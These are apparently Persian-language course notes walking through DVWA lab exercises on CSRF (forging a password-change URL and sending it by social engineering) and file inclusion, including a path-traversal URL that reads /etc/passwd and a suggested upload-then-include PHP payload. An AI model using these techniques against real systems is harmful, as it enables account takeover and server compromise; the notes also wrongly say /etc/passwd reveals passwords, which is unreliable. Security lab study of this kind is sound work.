	- ![[Pasted image 20240723192651.png]]
##### DVWA CSRF Logic & Instruction
0. `DVWA => CSRF Page ` Try to change Password Description
	1. مقداری برای پسورد وارد میکنیم، هنگامیکه بر روی تغییر پسورد کلیک میکنیم نوتیفیکیشن مشاهده میکنیم مبنی بر اینکه پسورد عوض شده است.
		1. ![[Pasted image 20240723194221.png]]
	2. حال کافیست به URL دقت کنید، میتوانیم با تغییر این و فرستادن این لینک به شخص دیگری آن شخص را نیز در State لاگین و احراز هویت شده قرار دهیم. 
		1. ![[Pasted image 20240723193735.png]]
	3. در واقع میتوانیم برای اکانت تارگت مثلا davoodya یک پسورد دلخواه تعیین کنیم و حال فقط کافیست لینک اجرا شود. پس از اجرا پسورد یوزر davoodya به پسورد که ما مشخص کردیم تغییر میکند.
	4. برای فرستادن لینک URL از ایمیل، پیامک و یا روش های دیگر مهندسی اجتماعی میتوانیم استفاده کنیم.
	5. *اسلاید*:
		1. ![[Pasted image 20240723193727.png]]
	6. برای ادامه تمرین، سطح امنیتی DVWA را بر روی Low قرار دهید.
1. `DVWA => CSRF ` Test Credential
	1. در این صفحه Button بنام `test Credential` وجود دارد که با کلیک بر روی آن میتوانیم وارد صفحه تست Credential شویم. از این صفحه برای امتحان پسورد تغییر کرده استفاده میکنیم.
#### Practical Demo
##### DVWA CSRF - Low Difficulty
0. *Pre-Requires*
	1. Set Security Level on Low
	2. goto `DVWA => CSRF` and Change Password then`Copy Full URL`
		1. ![[Pasted image 20240723194616.png]]
	3. در واقع این وب اپلیکشن با این لینک که کپی کردیم پسورد اکانت را تغییر میدهد. در نتیجه میتوانیم از این لینک با پسورد دلخواه برای دریافت State کاربر استفاده کنیم.
	4. `DVWA => CSRF => View Source ` Logic of Web Application
		1. با خواندن کد های Source برنامه میتوانیم متوجه منطق برنامه شویم. در این برنامه در سطح پایین فقط پسورد قدیمی با پسورد جدید مقایسه میشود و هیچ سرویس اضافه برای بررسی توکن و یا پسورد دو رمرحله ای وجود ندارد.
			1. ![[Pasted image 20240723195509.png]]
1. *Modify URL*
	1. حال پسورد دلخواه خود را در URL جایگذاری میکنیم و پس از آن URL ما آماده ارسال است. در اینجا میخواهیم پسورد اکانت تارگت را به `test1` تغییر دهیم در نتیجه باید URL مانند تصویر زیر شود:
		1. ![[Pasted image 20240723195001.png]]
	2. حال کافیست URL را در تب جدید در مرورگر Paste کنیم تا پسورد یوزر admin تغییر کند.
2. `DVWA => CSRF =>` *Test Credential*
	1. حال میتوانیم با کلیک بر روی `Test Credential` یوزر `admin` و پسورد `test1` را که تغییر دادیم را امتحان کنیم.
		1. ![[Pasted image 20240723195222.png]]
	2. اگر لاگین انجام شود بدین معناست که عملیات با موفقیت به پایان رسیده است.
### File Inclusion Vulnerabilities - E68
#### Definition & Instruction
##### What is File Inclusion Vulnerability?
- نوعی از آسیب پذیری میباشد که به Attacker اجازه میدهد فایلی را با استفاده از اسکریپتی به وب سرور منتقل کنیم.
- در واقع در این نوع آسیب پذیری، Path و نام فایلی که برای نمایش واکشی میشود را میتوانیم در URL وب اپلیکیشن مشاهده کنیم.
	- ![[Pasted image 20240723201322.png]]
- حال با استفاده از این آسیب پذیری میتوانیم فایل های سیستمی درون وب سرور را مانند `etc/passwd` واکشی کنیم.
- حال این فایل میتواند کد های مخرب، فایل PHP مخرب، و یا یک Reverse Shell فایل باشد که میتواند دسترسی را از راه دور به وب سرور برای attacker فراهم کند.
- آسیب پذیری File Inclusion دو تایپ کلی دارد >>
- *LFI(Local File Inclusion)*:
	- در این روش Attacker فایل را در وب سرور و حافظه لوکال  Include میکند.
- *RFI(Remote File Inclusion)*:
	- در این روش Attacker فایل را از یک سرور Remote مثلا بوسیله یک URL درون وب سرور Include میکند.
- *اسلاید*:
	- ![[Pasted image 20240723200642.png]]
##### DVWA File Inclusion Instruction
- وقتیکه به صفحه `DVWA => File Inclusion` میرویم چندین فایل را در صفحه میتوانیم مشاهده کنیم. هنگامیکه بر روی فایل اول کلیک میکنیم به صفحه ای منتقل میشویم و در آن صفحه در URL میتوانیم مشاهده کنیم که نام فایل در URL موجود است.
	![[Pasted image 20240723201114.png]]
- حال میتوانیم با وارد کردن نام فایل دلخواه در انتهای URL فایل را باز کنیم. مثلا میتوانیم فایل `etc/passwd` را باز کنیم تا پسورد اکانت های درون وب سرور را بدست بیاوریم.
	![[Pasted image 20240723201224.png]]
#### Practical Demo
0. *Pre-Requires*
	1. Set Security Level on Low
	2. goto `DVWA => File Inclusion` & Click on `file1.php`
		1. ![[Pasted image 20240723201719.png]]
	3. Now You can see File name in URL
		1. ![[Pasted image 20240723201753.png]]
1. *Get `/etc/passwd` file*
	1. حال باید با استفاده از کاراکتر زیر امتحان کنیم که چند دایرکتوری باید به عقب بازگردیم تا بتوانیم وارد `etc/passwd` بشویم.
		1. Characters => `../`
		2. در این مثال نیازمند 5 عدد تکرار از این کاراکتر ها هستیم.
		3. In this Scenario => `../../../../../etc/passwd`
			1. ![[Pasted image 20240723202136.png]]
	2. با تغییر URL و اجرای URL جدید فایل `etc/passwd` واکشی میشود و در ضفحه به نمایش در می آید.
	3. http://127.0.0.1:42001/vulnerabilities/fi/?page=../../../../../etc/passwd
			1. ![[Pasted image 20240723202457.png]]
	4. این موضوع که توانستیم فایلی را درون وب سرور واکشی کنیم و بخوانیم نشان دهنده این است که این وبسایت در مقابل File Inclusion آسیب پذیر است و میتوانیم انواع اکشن و حمله را بر روی این وب سرور پیاده سازی کنیم.
2. Another Attack Example
	1. مثلا میتوانیم ابتدا یک Payload PHP مخرب را در ماژول File Upload آپلود کنیم و سپس از ماژول File Inclusion سعی به اجرای Payload در وب سرور DVWA کنیم.
3. Hacking done.
### !